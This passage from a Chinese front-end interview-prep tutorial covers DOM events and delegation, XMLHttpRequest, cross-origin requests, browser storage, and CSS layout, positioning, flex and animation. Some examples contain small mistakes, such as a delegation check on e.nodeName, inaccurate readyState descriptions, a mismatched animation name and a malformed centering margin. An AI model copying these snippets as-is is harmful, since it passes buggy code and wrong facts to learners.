div1 = document.getElementById('div1') var child = div1.childNodes 复制 删除节点 var div1 = document.getElementById('div1') var child = div1.childNodes div1.removeChild(child[0]) 复制 还有其他操作的API，例如获取前一个节点、获取后一个节点等，但是面试过程中经常考到的就是上面几个。 事件 事件绑定 普通的事件绑定写法如下： var btn = document.getElementById('btn1') btn.addEventListener('click', function (event) &#123; // event.preventDefault() // 阻止默认行为 // event.stopPropagation() // 阻止冒泡 console.log('clicked') &#125;) 复制 为了编写简单的事件绑定，可以编写通用的事件绑定函数。这里虽然比较简单，但是会随着后文的讲解，来继续完善和丰富这个函数。 // 通用的事件绑定函数 function bindEvent(elem, type, fn) &#123; elem.addEventListener(type, fn) &#125; var a = document.getElementById('link1') // 写起来更加简单了 bindEvent(a, 'click', function(e) &#123; e.preventDefault() // 阻止默认行为 alert('clicked') &#125;) 复制 最后，如果面试被问到 IE 低版本兼容性问题，我劝你果断放弃这份工作机会。现在互联网流量都在 App 上， IE 占比越来越少，再去为 IE 浪费青春不值得，要尽量去做 App 相关的工作。 题目：什么是事件冒泡？ 事件冒泡 &lt;body&gt; &lt;div id=&quot;div1&quot;&gt; &lt;p id=&quot;p1&quot;&gt;激活&lt;/p&gt; &lt;p id=&quot;p2&quot;&gt;取消&lt;/p&gt; &lt;p id=&quot;p3&quot;&gt;取消&lt;/p&gt; &lt;p id=&quot;p4&quot;&gt;取消&lt;/p&gt; &lt;/div&gt; &lt;div id=&quot;div2&quot;&gt; &lt;p id=&quot;p5&quot;&gt;取消&lt;/p&gt; &lt;p id=&quot;p6&quot;&gt;取消&lt;/p&gt; &lt;/div&gt; &lt;/body&gt; 复制 对于以上 HTML 代码结构，要求点击p1时候进入激活状态，点击其他任何&lt;p&gt;都取消激活状态，如何实现？代码如下，注意看注释： var body = document.body bindEvent(body, 'click', function (e) &#123; // 所有 p 的点击都会冒泡到 body 上，因为 DOM 结构中 body 是 p 的上级节点，事件会沿着 DOM 树向上冒泡 alert('取消') &#125;) var p1 = document.getElementById('p1') bindEvent(p1, 'click', function (e) &#123; e.stopPropagation() // 阻止冒泡 alert('激活') &#125;) 复制 如果我们在p1``div1``body中都绑定了事件，它是会根据 DOM 的结构来冒泡，从下到上挨个执行的。但是我们使用e.stopPropagation()就可以阻止冒泡 题目：如何使用事件代理？有何好处？ 事件代理 我们设定一种场景，如下代码，一个&lt;div&gt;中包含了若干个&lt;a&gt;，而且还能继续增加。那如何快捷方便地为所有&lt;a&gt;绑定事件呢？ &lt;div id=&quot;div1&quot;&gt; &lt;a href=&quot;#&quot;&gt;a1&lt;/a&gt; &lt;a href=&quot;#&quot;&gt;a2&lt;/a&gt; &lt;a href=&quot;#&quot;&gt;a3&lt;/a&gt; &lt;a href=&quot;#&quot;&gt;a4&lt;/a&gt; &lt;/div&gt; &lt;button&gt;点击增加一个 a 标签&lt;/button&gt; 复制 这里就会用到事件代理。我们要监听&lt;a&gt;的事件，但要把具体的事件绑定到&lt;div&gt;上，然后看事件的触发点是不是&lt;a&gt;。 var div1 = document.getElementById('div1') div1.addEventListener('click', function (e) &#123; // e.target 可以监听到触发点击事件的元素是哪一个 var target = e.target if (e.nodeName === 'A') &#123; // 点击的是 &lt;a&gt; 元素 alert(target.innerHTML) &#125; &#125;) 复制 我们现在完善一下之前写的通用事件绑定函数，加上事件代理。 function bindEvent(elem, type, selector, fn) &#123; // 这样处理，可接收两种调用方式 bindEvent(div1, 'click', 'a', function () &#123;...&#125;) 和 bindEvent(div1, 'click', function () &#123;...&#125;) 这两种 if (fn == null) &#123; fn = selector selector = null &#125; // 绑定事件 elem.addEventListener(type, function (e) &#123; var target if (selector) &#123; // 有 selector 说明需要做事件代理 // 获取触发时间的元素，即 e.target target = e.target // 看是否符合 selector 这个条件 if (target.matches(selector)) &#123; fn.call(target, e) &#125; &#125; else &#123; // 无 selector ，说明不需要事件代理 fn(e) &#125; &#125;) &#125; 复制 然后这样使用，简单很多。 // 使用代理，bindEvent 多一个 'a' 参数 var div1 = document.getElementById('div1') bindEvent(div1, 'click', 'a', function (e) &#123; console.log(this.innerHTML) &#125;) // 不使用代理 var a = document.getElementById('a1') bindEvent(div1, 'click', function (e) &#123; console.log(a.innerHTML) &#125;) 复制 最后，使用代理的优点如下： 使代码简洁 减少浏览器的内存占用 Ajax XMLHttpRequest 题目：手写 XMLHttpRequest 不借助任何库 这是很多奇葩的、个性的面试官经常用的手段。这种考查方式存在很多争议，但是你不能完全说它是错误的，毕竟也是考查对最基础知识的掌握情况。 var xhr = new XMLHttpRequest() xhr.open(&quot;GET&quot;, &quot;/api&quot;, false) xhr.onreadystatechange = function () &#123; // 这里的函数异步执行，可参考之前 JS 基础中的异步模块 if (xhr.readyState == 4) &#123; if (xhr.status == 200) &#123; alert(xhr.responseText) &#125; &#125; &#125; xhr.send(null) 复制 当然，使用 jQuery、Zepto 或 Fetch 等库来写就更加简单了，这里不再赘述。 状态码说明 上述代码中，有两处状态码需要说明。xhr.readyState是浏览器判断请求过程中各个阶段的，xhr.status是 HTTP 协议中规定的不同结果的返回状态说明。 xhr.readyState的状态码说明： 0 - (未初始化）还没有调用send()方法 1 -（载入）已调用send()方法，正在发送请求 2 -（载入完成）send()方法执行完成，已经接收到全部响应内容 3 -（交互）正在解析响应内容 4 -（完成）响应内容解析完成，可以在客户端调用了 题目：HTTP 协议中，response 的状态码，常见的有哪些？ xhr.status即 HTTP 状态码，有 2xx``3xx``4xx``5xx 这几种，比较常用的有以下几种： 200 正常 3xx 301 永久重定向。如http://xxx.com这个 GET 请求（最后没有/），就会被301到http://xxx.com/（最后是/） 302 临时重定向。临时的，不是永久的 304 资源找到但是不符合请求条件，不会返回任何主体。如发送 GET 请求时，head 中有If-Modified-Since: xxx（要求返回更新时间是xxx时间之后的资源），如果此时服务器 端资源未更新，则会返回304，即不符合要求 404 找不到资源 5xx 服务器端出错了 看完要明白，为何上述代码中要同时满足xhr.readyState == 4和xhr.status == 200。 Fetch API 目前已经有一个获取 HTTP 请求更加方便的 API：Fetch，通过Fetch提供的fetch()这个全局函数方法可以很简单地发起异步请求，并且支持Promise的回调。但是 Fetch API 是比较新的 API，具体使用的时候还需要查查 caniuse，看下其浏览器兼容情况。 看一个简单的例子： fetch('some/api/data.json', &#123; method:'POST', //请求类型 GET、POST headers:&#123;&#125;, // 请求的头信息，形式为 Headers 对象或 ByteString body:&#123;&#125;, //请求发送的数据 blob、BufferSource、FormData、URLSearchParams（get 或head 方法中不能包含 body） mode:'', //请求的模式，是否跨域等，如 cors、 no-cors 或 same-origin credentials:'', //cookie 的跨域策略，如 omit、same-origin 或 include cache:'', //请求的 cache 模式: default、no-store、reload、no-cache、 force-cache 或 only-if-cached &#125;).then(function(response) &#123; ... &#125;); 复制 Fetch 支持headers定义，通过headers自定义可以方便地实现多种请求方法（ PUT、GET、POST 等）、请求头（包括跨域）和cache策略等；除此之外还支持 response（返回数据）多种类型，比如支持二进制文件、字符串和formData等。 跨域 题目：如何实现跨域？ 浏览器中有 同源策略 ，即一个域下的页面中，无法通过 Ajax 获取到其他域的接口。例如有一个接口http://m.juejin.com/course/ajaxcourserecom?cid=459，你自己的一个页面http://www.yourname.com/page1.html中的 Ajax 无法获取这个接口。这正是命中了“同源策略”。如果浏览器哪些地方忽略了同源策略，那就是浏览器的安全漏洞，需要紧急修复。 url 哪些地方不同算作跨域？ 协议 域名 端口 但是 HTML 中几个标签能逃避过同源策略——&lt;script src=&quot;xxx&quot;&gt;、&lt;img src=&quot;xxxx&quot;/&gt;、&lt;link href=&quot;xxxx&quot;&gt;，这三个标签的src/href可以加载其他域的资源，不受同源策略限制。 因此，这使得这三个标签可以做一些特殊的事情。 &lt;img&gt;可以做打点统计，因为统计方并不一定是同域的，在讲解 JS 基础知识异步的时候有过代码示例。除了能跨域之外，&lt;img&gt;几乎没有浏览器兼容问题，它是一个非常古老的标签。 &lt;script&gt;和&lt;link&gt;可以使用 CDN，CDN 基本都是其他域的链接。 另外&lt;script&gt;还可以实现 JSONP，能获取其他域接口的信息，接下来马上讲解。 但是请注意，所有的跨域请求方式，最终都需要信息提供方来做出相应的支持和改动，也就是要经过信息提供方的同意才行，否则接收方是无法得到它们的信息的，浏览器是不允许的。 解决跨域 - JSONP 首先，有一个概念你要明白，例如访问http://coding.m.juejin.com/classindex.html的时候，服务器端就一定有一个classindex.html文件吗？—— 不一定，服务器可以拿到这个请求，动态生成一个文件，然后返回。 同理，&lt;script src=&quot;http://coding.m.juejin.com/api.js&quot;&gt;也不一定加载一个服务器端的静态文件，服务器也可以动态生成文件并返回。OK，接下来正式开始。 例如我们的网站和掘金网，肯定不是一个域。我们需要掘金网提供一个接口，供我们来获取。首先，我们在自己的页面这样定义 &lt;script&gt; window.callback = function (data) &#123; // 这是我们跨域得到信息 console.log(data) &#125; &lt;/script&gt; 复制 然后掘金网给我提供了一个http://coding.m.juejin.com/api.js，内容如下（之前说过，服务器可动态生成内容） callback(&#123;x:100, y:200&#125;) 复制 最后我们在页面中加入&lt;script src=&quot;http://coding.m.juejin.com/api.js&quot;&gt;&lt;/script&gt;，那么这个js加载之后，就会执行内容，我们就得到内容了。 解决跨域 - 服务器端设置 http header 这是需要在服务器端设置的，作为前端工程师我们不用详细掌握，但是要知道有这么个解决方案。而且，现在推崇的跨域解决方案是这一种，比 JSONP 简单许多。 response.setHeader(&quot;Access-Control-Allow-Origin&quot;, &quot;http://m.juejin.com/&quot;); // 第二个参数填写允许跨域的域名称，不建议直接写 &quot;*&quot; response.setHeader(&quot;Access-Control-Allow-Headers&quot;, &quot;X-Requested-With&quot;); response.setHeader(&quot;Access-Control-Allow-Methods&quot;, &quot;PUT,POST,GET,DELETE,OPTIONS&quot;); // 接收跨域的cookie response.setHeader(&quot;Access-Control-Allow-Credentials&quot;, &quot;true&quot;); 复制 存储 题目：cookie 和 localStorage 有何区别？ cookie cookie 本身不是用来做服务器端存储的（计算机领域有很多这种“狗拿耗子”的例子，例如 CSS 中的 float），它是设计用来在服务器和客户端进行信息传递的，因此我们的每个 HTTP 请求都带着 cookie。但是 cookie 也具备浏览器端存储的能力（例如记住用户名和密码），因此就被开发者用上了。 使用起来也非常简单，document.cookie = ....即可。 但是 cookie 有它致命的缺点： 存储量太小，只有 4KB 所有 HTTP 请求都带着，会影响获取资源的效率 API 简单，需要封装才能用 locationStorage 和 sessionStorage 后来，HTML5 标准就带来了sessionStorage和localStorage，先拿localStorage来说，它是专门为了浏览器端缓存而设计的。其优点有： 存储量增大到 5MB 不会带到 HTTP 请求中 API 适用于数据存储 localStorage.setItem(key, value)``localStorage.getItem(key) sessionStorage的区别就在于它是根据 session 过去时间而实现，而localStorage会永久有效，应用场景不同。例如，一些需要及时失效的重要信息放在sessionStorage中，一些不重要但是不经常设置的信息，放在localStorage中。 另外告诉大家一个小技巧，针对localStorage.setItem，使用时尽量加入到try-catch中，某些浏览器是禁用这个 API 的，要注意。 小结 本小节总结了 W3C 标准中 Web-API 部分，面试中常考的知识点，这些也是日常开发中最常用的 API 和知识。 上一篇：一面 1：ES 基础知识点与高频考题解析下一篇：一面 3：CSS-HTML 知识点与高频考题解析 一面 3：CSS-HTML 知识点与高频考题解析 CSS 和 HTML 是网页开发中布局相关的组成部分，涉及的内容比较多和杂乱，本小节重点介绍下常考的知识点。 知识点梳理 选择器的权重和优先级 盒模型 盒子大小计算 margin 的重叠计算 浮动float 浮动布局概念 清理浮动 定位position 文档流概念 定位分类 fixed 定位特点 绝对定位计算方式 flex布局 如何实现居中对齐？ 理解语义化 CSS3 动画 重绘和回流 选择器的权重和优先级 CSS 选择器有很多，不同的选择器的权重和优先级不一样，对于一个元素，如果存在多个选择器，那么就需要根据权重来计算其优先级。 权重分为四级，分别是： 代表内联样式，如style=&quot;xxx&quot;，权值为 1000； 代表 ID 选择器，如#content，权值为 100； 代表类、伪类和属性选择器，如.content、:hover、[attribute]，权值为 10； 代表元素选择器和伪元素选择器，如div、p，权值为 1。 需要注意的是：通用选择器（*）、子选择器（&gt;）和相邻同胞选择器（+）并不在这四个等级中，所以他们的权值都为 0。 权重值大的选择器其优先级也高，相同权重的优先级又遵循后定义覆盖前面定义的情况。 盒模型 什么是“盒子” 初学 CSS 的朋友，一开始学 CSS 基础知识的时候一定学过padding``border和margin，即内边距、边框和外边距。它们三者就构成了一个“盒子”。就像我们收到的快递，本来买了一部小小的手机，收到的却是那么大一个盒子。因为手机白色的包装盒和手机机器之间有间隔层（内边距），手机白色盒子有厚度，虽然很薄（边框），盒子和快递箱子之间还有一层泡沫板（外边距）。这就是一个典型的盒子。 ![](data:image/svg+xml;utf8,) 如上图，真正的内容就是这些文字，文字外围有 10px 的内边距，5px 的边框，10px 的外边距。看到盒子了吧？ 题目：盒子模型的宽度如何计算 固定宽度的盒子 &lt;div style=&quot;padding:10px; border:5px solid blue; margin: 10px; width:300px;&quot;&gt; 之前看过一篇文章，叫做《浏览器工作原理：新式网络浏览器幕后揭秘》， 文章言简意赅的介绍的浏览器的工作过程，web前端 &lt;/div&gt; 复制 ![](data:image/svg+xml;utf8,) 如上图，得到网页效果之后，我们可以用截图工具来量一下文字内容的宽度。发现，文字内容的宽度刚好是 300px，也就是我们设置的宽度。 因此，在盒子模型中，我们设置的宽度都是内容宽度，不是整个盒子的宽度。而整个盒子的宽度是：（内容宽度 + border宽度 + padding宽度 + margin宽度）之和。这样我们改四个中的其中一个，都会导致盒子宽度的改变。这对我们来说不友好。 没关系，这个东西不友好早就有人发现了，而且已经解决，下文再说。 充满父容器的盒子 默认情况下，div是display:block，宽度会充满整个父容器。如下图： &lt;div style=&quot;padding:10px; border:5px solid blue; margin: 10px; width:300px;&quot;&gt; 之前看过一篇文章，叫做《浏览器工作原理：新式网络浏览器幕后揭秘》， 文章言简意赅的介绍的浏览器的工作过程，web前端 之前看过一篇文章，叫做《浏览器工作原理：新式网络浏览器幕后揭秘》， 文章言简意赅的介绍的浏览器的工作过程，web前端 &lt;/div&gt; 复制 ![](data:image/svg+xml;utf8,) 但是别忘记，这个 div 是个盒子模型，它的整个宽度包括（内容宽度 + border宽度 + padding宽度 + margin宽度），整个的宽度充满父容器。 问题就在这里。如果父容器宽度不变，我们手动增大margin、border或padding其中一项的宽度值，都会导致内容宽度的减少。极端情况下，如果内容的宽度压缩到不能再压缩了（例如一个字的宽度），那么浏览器会强迫增加父容器的宽度。这可不是我们想要看到的。 包裹内容的盒子 这种情况下比较简单，内容的宽度按照内容计算，盒子的宽度将在内容宽度的基础上再增加（padding宽度 + border宽度 + margin宽度）之和。 &lt;div style=&quot;padding:10px; border:5px solid blue; margin: 10px; width:300px;&quot;&gt; 之前看过一篇文章，叫做《浏览器工作原理：新式网络浏览器幕后揭秘》 &lt;/div&gt; 复制 ![](data:image/svg+xml;utf8,) box-sizing:border-box 前面提到，为盒子模型设置宽度，结果只是设置了内容的宽度，这个不合理。如何解决这一问题？答案就是为盒子指定样式：box-sizing:border-box。 &lt;div style=&quot;padding:10px; border:5px solid blue; margin: 10px; width:300px; box-sizing:border-box;&quot;&gt; 之前看过一篇文章，叫做《浏览器工作原理：新式网络浏览器幕后揭秘》 &lt;/div&gt; 复制 ![](data:image/svg+xml;utf8,) 上图中，为div设置了box-sizing:border-box之后，300px 的宽度是内容 + border + 边框的宽度（不包括margin），这样就比较符合我们的实际要求了。建议大家在为系统写 CSS 时候，第一个样式是： * &#123; box-sizing:border-box; &#125; 复制 大名鼎鼎的 Bootstrap 也把box-sizing:border-box加入到它的*选择器中，我们为什么不这样做呢？ 纵向 margin 重叠 这里提到 margin，就不得不提一下 margin 的这一特性——纵向重叠。如&lt;p&gt;的纵向 margin 是 16px，那么两个&lt;p&gt;之间纵向的距离是多少？—— 按常理来说应该是 16 + 16 = 32px，但是答案仍然是 16px。因为纵向的 margin 是会重叠的，如果两者不一样大的话，大的会把小的“吃掉”。 浮动float float 用于网页布局比较多，使用起来也比较简单，这里总结了一些比较重要、需要注意的知识点，供大家参考。 误解和误用 float 被设计出来的初衷是用于文字环绕效果，即一个图片一段文字，图片float:left之后，文字会环绕图片。 &lt;div&gt; &lt;img src=&quot;image/1.png&quot; style=&quot;float:left&quot;&gt; 一段文字一段文字一段文字一段文字一段文字一段文字一段文字一段文字一段文字 &lt;/div&gt; 复制 但是，后来大家发现结合float + div可以实现之前通过table实现的网页布局，因此就被“误用”于网页布局了。 题目：为何 float 会导致父元素塌陷？ 破坏性 ![](data:image/svg+xml;utf8,) float 的破坏性 —— float 破坏了父标签的原本结构，使得父标签出现了坍塌现象。导致这一现象的最根本原因在于：被设置了 float 的元素会脱离文档流。其根本原因在于 float 的设计初衷是解决文字环绕图片的问题。大家要记住 float 的这个影响。 包裹性 包裹性也是 float 的一个非常重要的特性，大家用 float 时一定要熟知这一特性。咱们还是先从一个小例子看起： ![](data:image/svg+xml;utf8,) 如上图，普通的 div 如果没有设置宽度，它会撑满整个屏幕，在之前的盒子模型那一节也讲到过。而如果给 div 增加float:left之后，它突然变得紧凑了，宽度发生了变化，把内容中的三个字包裹了——这就是包裹性。为 div 设置了 float 之后，其宽度会自动调整为包裹住内容宽度，而不是撑满整个父容器。 注意，此时 div 虽然体现了包裹性，但是它的 display 样式是没有变化的，还是display: block。 float 为什么要具有包裹性？其实答案还是得从 float 的设计初衷来寻找，float 是被设计用于实现文字环绕效果的。文字环绕图片比较好理解，但是如果想要让文字环绕一个 div 呢？此时 div 不被“包裹”起来的话，就无法实现环绕效果了。 清空格 float 还有一个大家可能不是很熟悉的特性——清空格。按照惯例，咱还是先举例子说明。 &lt;div style=&quot;border: 2px solid blue; padding:3px;&quot;&gt; &lt;img src=&quot;image/1.png&quot;/&gt; &lt;img src=&quot;image/2.png&quot;/&gt; &lt;img src=&quot;image/3.png&quot;/&gt; &lt;img src=&quot;image/4.png&quot;/&gt; &lt;/div&gt; 复制 ![](data:image/svg+xml;utf8,) 加上float:left之后： ![](data:image/svg+xml;utf8,) 上面第一张图中，正常的 img 中间是会有空格的，因为多个 img 标签会有换行，而浏览器识别换行为空格，这也是很正常的。第二张图中，为 img 增加了float:left的样式，这就使得 img 之间没有了空格，4 个 img 紧紧挨着。 如果大家之前没注意，现在想想之前写过的程序，是不是有这个特性。为什么 float 适合用于网页排版（俗称“砌砖头”）？就是因为 float 排版出来的网页严丝合缝，中间连个苍蝇都飞不进去。 “清空格”这一特性的根本原因是 float 会导致节点脱离文档流结构。它都不属于文档流结构了，那么它身边的什么换行、空格就都和它没了关系，它就尽量往一边靠拢，能靠多近就靠多近，这就是清空格的本质。 题目：手写 clearfix clearfix 清除浮动的影响，一般使用的样式如下，统称clearfix代码。所有 float 元素的父容器，一般情况下都应该加clearfix这个 class。 .clearfix:after &#123; content: ''; display: table; clear: both; &#125; .clearfix &#123; *zoom: 1; /* 兼容 IE 低版本 */ &#125; 复制 &lt;div class=&quot;clearfix&quot;&gt; &lt;img src=&quot;image/1.png&quot; style=&quot;float: left&quot;/&gt; &lt;img src=&quot;image/2.png&quot; style=&quot;float: left&quot;/&gt; &lt;/div&gt; 复制 小结 float 的设计初衷是解决文字环绕图片的问题，后来误打误撞用于做布局，因此有许多不合适或者需要注意的地方，上文基本都讲到了需要的知识点。如果是刚开始接触 float 的同学，学完上面的基础知识之后，还应该做一些练习实战一下 —— 经典的“圣杯布局”和“双飞翼布局”。这里就不再展开讲了，网上资料非常多，例如浅谈面试中常考的两种经典布局——圣杯与双飞翼（此文的最后两张图清晰地展示了这两种布局）。 定位position position 用于网页元素的定位，可设置 static/relative/absolute/fixed 这些值，其中 static 是默认值，不用介绍。 题目：relative 和 absolute 有何区别？ relative 相对定位 relative 可以用一个例子很轻松地演示出来。例如我们写 4 个&lt;p&gt;，出来的样子大家不用看也能知道。 &lt;p&gt;第一段文字&lt;/p&gt; &lt;p&gt;第二段文字&lt;/p&gt; &lt;p&gt;第三段文字&lt;/p&gt; &lt;p&gt;第四段文字&lt;/p&gt; 复制 ![](data:image/svg+xml;utf8,) 然后我们在第三个&lt;p&gt;上面，加上position:relative并且设置left和top值，看这个&lt;p&gt;有什么变化。 &lt;p&gt;第一段文字&lt;/p&gt; &lt;p&gt;第二段文字&lt;/p&gt; &lt;p style=&quot;position:relative; top: 10px; left: 10px&quot;&gt;第三段文字&lt;/p&gt; &lt;p&gt;第四段文字&lt;/p&gt; 复制 ![](data:image/svg+xml;utf8,) 上图中，大家应该要识别出两个信息（相信大部分人会忽略第二个信息） 第三个&lt;p&gt;发生了位置变化，分别向右向下移动了10px； 其他的三个&lt;p&gt;位置没有发生变化，这一点也很重要。 可见，relative 会导致自身位置的相对变化，而不会影响其他元素的位置、大小。这是 relative 的要点之一。还有第二个要点，就是 relative 产生一个新的定位上下文。下文有关于定位上下文的详细介绍，这里可以先通过一个例子来展示一下区别： ![](data:image/svg+xml;utf8,) 注意看这两图的区别，下文将有解释。 absolute 还是先写一个基本的 demo。 &lt;p&gt;第一段文字&lt;/p&gt; &lt;p&gt;第二段文字&lt;/p&gt; &lt;p style=&quot;background: yellow&quot;&gt;第三段文字&lt;/p&gt; &lt;p&gt;第四段文字&lt;/p&gt; 复制 ![](data:image/svg+xml;utf8,) 然后，我们把第三个&lt;p&gt;改为position:absolute;，看看会发生什么变化。 ![](data:image/svg+xml;utf8,) 从上面的结果中，我们能看出几点信息： absolute 元素脱离了文档结构。和 relative 不同，其他三个元素的位置重新排列了。只要元素会脱离文档结构，它就会产生破坏性，导致父元素坍塌。（此时你应该能立刻想起来，float 元素也会脱离文档结构。） absolute 元素具有“包裹性”。之前&lt;p&gt;的宽度是撑满整个屏幕的，而此时&lt;p&gt;的宽度刚好是内容的宽度。 absolute 元素具有“跟随性”。虽然 absolute 元素脱离了文档结构，但是它的位置并没有发生变化，还是老老实实地呆在它原本的位置，因为我们此时没有设置 top、left 的值。 absolute 元素会悬浮在页面上方，会遮挡住下方的页面内容。 最后，通过给 absolute元素设置 top、left 值，可自定义其内容，这个都是平时比较常用的了。这里需要注意的是，设置了 top、left 值时，元素是相对于最近的定位上下文来定位的，而不是相对于浏览器定位。 fixed 其实 fixed 和 absolute 是一样的，唯一的区别在于：absolute 元素是根据最近的定位上下文确定位置，而 fixed 根据浏览器确定位置。 题目：relative、absolute 和 fixed 分别依据谁来定位？ 定位上下文 relative 元素的定位永远是相对于元素自身位置的，和其他元素没关系，也不会影响其他元素。 ![](data:image/svg+xml;utf8,) fixed 元素的定位是相对于浏览器边界的，和其他元素没有关系。但是它具有破坏性，会导致其他元素位置的变化。 ![](data:image/svg+xml;utf8,) absolute 的定位相对于前两者要复杂许多。如果为 absolute 设置了 top、left，浏览器会根据什么去确定它的纵向和横向的偏移量呢？答案是浏览器会递归查找该元素的所有父元素，如果找到一个设置了position:relative/absolute/fixed的元素，就以该元素为基准定位，如果没找到，就以浏览器边界定位。如下两个图所示： ![](data:image/svg+xml;utf8,) ![](data:image/svg+xml;utf8,) flex布局 布局的传统解决方案基于盒子模型，依赖 display 属性 + position 属性 + float 属性。它对于那些特殊布局非常不方便，比如，垂直居中（下文会专门讲解）就不容易实现。在目前主流的移动端页面中，使用 flex 布局能更好地完成需求，因此 flex 布局的知识是必须要掌握的。 基本使用 任何一个容器都可以使用 flex 布局，代码也很简单。 &lt;style type=&quot;text/css&quot;&gt; .container &#123; display: flex; &#125; .item &#123; border: 1px solid #000; flex: 1; &#125; &lt;/style&gt; &lt;div class=&quot;container&quot;&gt; &lt;div class=&quot;item&quot;&gt;aaa&lt;/div&gt; &lt;div class=&quot;item&quot; style=&quot;flex: 2&quot;&gt;bbb&lt;/div&gt; &lt;div class=&quot;item&quot;&gt;ccc&lt;/div&gt; &lt;div class=&quot;item&quot;&gt;ddd&lt;/div&gt; &lt;/div&gt; 复制 ![](data:image/svg+xml;utf8,) 注意，第三个&lt;div&gt;的flex: 2，其他的&lt;div&gt;的flex: 1，这样第二个&lt;div&gt;的宽度就是其他的&lt;div&gt;的两倍。 设计原理 设置了display: flex的元素，我们称为“容器”（flex container），其所有的子节点我们称为“成员”（flex item）。容器默认存在两根轴：水平的主轴（main axis）和垂直的交叉轴（cross axis）。主轴的开始位置（与边框的交叉点）叫做 main start，结束位置叫做 main end；交叉轴的开始位置叫做 cross start，结束位置叫做cross end。项目默认沿主轴排列。单个项目占据的主轴空间叫做 main size，占据的交叉轴空间叫做 cross size。 ![](data:image/svg+xml;utf8,) 将以上文字和图片结合起来，再详细看一遍，这样就能理解 flex 的设计原理，才能更好地实际使用。 设置主轴的方向 flex-direction可决定主轴的方向，有四个可选值： row（默认值）：主轴为水平方向，起点在左端。 row-reverse：主轴为水平方向，起点在右端。 column：主轴为垂直方向，起点在上沿。 column-reverse：主轴为垂直方向，起点在下沿。 .box { flex-direction: column-reverse| column | row | row-reverse; } 复制 以上代码设置的主轴方向，将依次对应下图： ![](data:image/svg+xml;utf8,) 设置主轴的对齐方式 justify-content属性定义了项目在主轴上的对齐方式，值如下： flex-start（默认值）：向主轴开始方向对齐。 flex-end：向主轴结束方向对齐。 center： 居中。 space-between：两端对齐，项目之间的间隔都相等。 space-around：每个项目两侧的间隔相等。所以，项目之间的间隔比项目与边框的间隔大一倍。 .box { justify-content: flex-start | flex-end | center | space-between | space-around; } 复制 ![](data:image/svg+xml;utf8,) 交叉轴的对齐方式 align-items属性定义项目在交叉轴上如何对齐，值如下： flex-start：交叉轴的起点对齐。 flex-end：交叉轴的终点对齐。 center：交叉轴的中点对齐。 baseline: 项目的第一行文字的基线对齐。 stretch（默认值）：如果项目未设置高度或设为 auto，将占满整个容器的高度。 .box { align-items: flex-start | flex-end | center | baseline | stretch; } 复制 ![](data:image/svg+xml;utf8,) 如何实现居中对齐？ 题目：如何实现水平居中？ 水平居中 inline 元素用text-align: center;即可，如下： .container &#123; text-align: center; &#125; 复制 block 元素可使用margin: auto;，PC 时代的很多网站都这么搞。 .container &#123; text-align: center; &#125; .item &#123; width: 1000px; margin: auto; &#125; 复制 绝对定位元素可结合left和margin实现，但是必须知道宽度。 .container &#123; position: relative; width: 500px; &#125; .item &#123; width: 300px; height: 100px; position: absolute; left: 50%; margin: -150px; &#125; 复制 题目：如何实现垂直居中？ 垂直居中 inline 元素可设置line-height的值等于height值，如单行文字垂直居中： .container &#123; height: 50px; line-height: 50px; &#125; 复制 绝对定位元素，可结合left和margin实现，但是必须知道尺寸。 优点：兼容性好 缺点：需要提前知道尺寸 .container { position: relative; height: 200px; } .item { width: 80px; height: 40px; position: absolute; left: 50%; top: 50%; margin-top: -20px; margin-left: -40px; } 复制 绝对定位可结合transform实现居中。 优点：不需要提前知道尺寸 缺点：兼容性不好 .container { position: relative; height: 200px; } .item { width: 80px; height: 40px; position: absolute; left: 50%; top: 50%; transform: translate(-50%, -50%); background: blue; } 复制 绝对定位结合margin: auto，不需要提前知道尺寸，兼容性好。 .container &#123; position: relative; height: 300px; &#125; .item &#123; width: 100px; height: 50px; position: absolute; left: 0; top: 0; right: 0; bottom: 0; margin: auto; &#125; 复制 其他的解决方案还有，不过没必要掌握太多，能说出上文的这几个解决方案即可。 理解语义化 题目：如何理解 HTML 语义化？ 所谓“语义”就是为了更易读懂，这要分两部分： 让人（写程序、读程序）更易读懂 让机器（浏览器、搜索引擎）更易读懂 让人更易读懂 对于人来说，代码可读性、语义化就是一个非常广泛的概念了，例如定义 JS 变量的时候使用更易读懂的名称，定义 CSS class 的时候也一样，例如length``list等，而不是使用a``b这种谁都看不懂的名称。 不过我们平常考查的“语义化”并不会考查这么广义、这么泛的问题，而是考查 HTML 的语义化，是为了更好地让机器读懂 HTML。 让机器更易读懂 HTML 符合 XML 标准，但又和 XML 不一样 —— HTML 不允许像 XML 那样自定义标签名称，HTML 有自己规定的标签名称。问题就在这里 —— HTML 为何要自己规定那么多标签名称呢，例如p``div``h1``ul等 —— 就是为了语义化。其实，如果你精通 CSS 的话，你完全可以全部用&lt;div&gt;标签来实现所有的网页效果，其他的p``h1``ul等标签可以一个都不用。但是我们不推荐这么做，这样做就失去了 HTML 语义化的意义。 拿搜索引擎来说，爬虫下载到我们网页的 HTML 代码，它如何更好地去理解网页的内容呢？—— 就是根据 HTML 既定的标签。h1标签就代表是标题；p里面的就是段落详细内容，权重肯定没有标题高；ul里面就是列表；strong就是加粗的强调的内容 …… 如果我们不按照 HTML 语义化来写，全部都用&lt;div&gt;标签，那搜索引擎将很难理解我们网页的内容。 为了加强 HTML 语义化，HTML5 标准中又增加了header``section``artical等标签。因此，书写 HTML 时，语义化是非常重要的，否则 W3C 也没必要辛辛苦苦制定出这些标准来。 CSS3 动画 CSS3 可以实现动画，代替原来的 Flash 和 JavaScript 方案。 首先，使用@keyframes定义一个动画，名称为testAnimation，如下代码，通过百分比来设置不同的 CSS 样式，规定动画的变化。所有的动画变化都可以这么定义出来。 @keyframes testAnimation &#123; 0% &#123;background: red; left:0; top:0;&#125; 25% &#123;background: yellow; left:200px; top:0;&#125; 50% &#123;background: blue; left:200px; top:200px;&#125; 75% &#123;background: green; left:0; top:200px;&#125; 100% &#123;background: red; left:0; top:0;&#125; &#125; 复制 然后，针对一个 CSS 选择器来设置动画，例如针对div元素设置动画，如下： div &#123; width: 100px; height: 50px; position: absolute; animation-name: myfirst; animation-duration: 5s; &#125; 复制 animation-name对应到动画名称，animation-duration是动画时长，还有其他属性： animation-timing-function：规定动画的速度曲线。默认是ease animation-delay：规定动画何时开始。默认是 0 animation-iteration-count：规定动画被播放的次数。默认是 1 animation-direction：规定动画是否在下一周期逆向地播放。默认是normal animation-play-state ：规定动画是否正在运行或暂停。默认是running animation-fill-mode：规定动画执行之前和之后如何给动画的目标应用，默认是none，保留在最后一帧可以用forwards 题目：CSS 的transition和animation有何区别？ 